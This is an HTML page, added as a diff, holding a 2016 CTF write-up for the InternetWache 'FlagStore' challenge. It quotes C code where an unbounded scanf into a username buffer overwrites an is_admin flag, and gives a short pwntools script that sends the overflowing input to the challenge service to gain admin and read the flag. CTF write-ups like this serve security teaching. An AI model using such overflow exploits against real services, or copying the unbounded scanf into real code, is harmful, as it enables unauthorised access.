@@ -1,0 +1,38 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="xil.se"><link rel=prev href=https://blog.xil.se/posts/internetwache-2016-exp60-kbeckmann/><link rel=next href=https://blog.xil.se/posts/internetwache-2016-exp80-kbeckmann/><link rel=canonical href=https://blog.xil.se/posts/internetwache-2016-exp70-kbeckmann/><link rel=apple-touch-icon sizes=180x180 href=https://blog.xil.se/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://blog.xil.se/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://blog.xil.se/favicon-16x16.png><link rel=manifest href=https://blog.xil.se/site.webmanifest><link rel=mask-icon href=https://blog.xil.se/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>InternetWache 2016 FlagStore (Exploit 70) Writeup | Blog</title><meta name=title content="InternetWache 2016 FlagStore (Exploit 70) Writeup | Blog"><link rel=stylesheet href=https://blog.xil.se/font/iconfont.css><link rel=stylesheet href=https://blog.xil.se/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.xil.se\/"},"articleSection":"posts","name":"InternetWache 2016 FlagStore (Exploit 70) Writeup","headline":"InternetWache 2016 FlagStore (Exploit 70) Writeup","description":"Problem  Description: Here\u0026rsquo;s the ultimate flag store. Store and retrieve your flags whenever you want.\n (exp70, solved by 244)\nAttachment: exp70.zip\nService: 188.166.133.53:12157\nSolution The zip contains c-code for the challenge. Looking at it I immediately see an overflow and an interesting location for the admin flag.\nchar username[500]; int is_admin = 0; \/\/ \u0026lt;-- can be overwritten char password[500]; ... printf(\u0026#34;Enter an username:\u0026#34;); scanf(\u0026#34;%s\u0026#34;, username); \/\/ scanf will overwrite username and is_admin The exploit is to simply send a long username and a \\x01 byte.","inLanguage":"en-us","author":"kbeckmann","creator":"kbeckmann","publisher":"kbeckmann","accountablePerson":"kbeckmann","copyrightHolder":"kbeckmann","copyrightYear":"2016","datePublished":"2016-02-21 00:08:47 \u002b0100 \u002b0100","dateModified":"2016-02-21 00:08:47 \u002b0100 \u002b0100","url":"https:\/\/blog.xil.se\/posts\/internetwache-2016-exp70-kbeckmann\/","wordCount":"111","keywords":["Blog"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.xil.se/>Blog</a></div><div class="menu navbar-right"><a class=menu-item href=https://blog.xil.se/posts/>Blog</a>
+<a class=menu-item href=https://blog.xil.se/categories/>Categories</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.xil.se/>Blog</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=https://blog.xil.se/posts/>Blog</a>
+<a class=menu-item href=https://blog.xil.se/categories/>Categories</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">InternetWache 2016 FlagStore (Exploit 70) Writeup</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.xil.se/author/kbeckmann rel=author>kbeckmann</a> with ♥
+<span class=post-time>on <time datetime=2016-02-21 itemprop=datePublished>February 21, 2016</time></span>
+in
+<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.xil.se/categories/writeups/>writeups</a></span></div></header><div class=post-content><h1 id=problem>Problem</h1><blockquote><p>Description: Here&rsquo;s the ultimate flag store. Store and retrieve your flags whenever you want.</p></blockquote><p>(exp70, solved by 244)</p><p>Attachment: exp70.zip</p><p>Service: 188.166.133.53:12157</p><h1 id=solution>Solution</h1><p>The zip contains c-code for the challenge. Looking at it I immediately see an overflow and an interesting location for the <code>admin</code> flag.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=color:#66d9ef>char</span> username[<span style=color:#ae81ff>500</span>];
+<span style=color:#66d9ef>int</span> is_admin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// &lt;-- can be overwritten
+</span><span style=color:#75715e></span><span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>500</span>];
+
+...
+
+printf(<span style=color:#e6db74>&#34;Enter an username:&#34;</span>);
+scanf(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
+
+<span style=color:#75715e>// scanf will overwrite username and is_admin
+</span></code></pre></div><p>The exploit is to simply send a long username and a \x01 byte.</p><pre><code>#!/usr/bin/env python2
+from pwn import *
+
+r = remote('188.166.133.53', 12157)
+
+r.recvuntil('4\n')
+
+r.sendline('1')
+r.sendline('A'*499 + '\x00\x01')
+r.sendline('A'*8)
+r.sendline('2')
+r.sendline('A'*499)
+r.sendline('A'*8)
+r.sendline('3')
+
+print r.clean()
+</code></pre><p>Your flag: <strong>IW{Y_U_NO_HAZ_FLAG}</strong></p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
+<span>xil.se</span></p><p class=copyright-item><span>Link:</span>
+<a href=https://blog.xil.se/posts/internetwache-2016-exp70-kbeckmann/>https://blog.xil.se/posts/internetwache-2016-exp70-kbeckmann/</span></p></div><div class=post-tags><section><a href=javascript:window.history.back();>back</a></span> ·
+<span><a href=https://blog.xil.se/>home</a></span></section></div><div class=post-nav><a href=https://blog.xil.se/posts/internetwache-2016-exp60-kbeckmann/ class=prev rel=prev title="InternetWache 2016 EquationSolver (Exploit 60) Writeup"><i class="iconfont icon-left"></i>&nbsp;InternetWache 2016 EquationSolver (Exploit 60) Writeup</a>
+<a href=https://blog.xil.se/posts/internetwache-2016-exp80-kbeckmann/ class=next rel=next title="InternetWache 2016 Remote Printer (Exploit 80) Writeup">InternetWache 2016 Remote Printer (Exploit 80) Writeup&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment></div></article></div></main><footer class=footer><div class=copyright>&copy;
+<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.xil.se/>xil.se</a> |</span>
+<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><script src=https://blog.xil.se/js/vendor_no_gallery.min.js async></script></div></body></html>
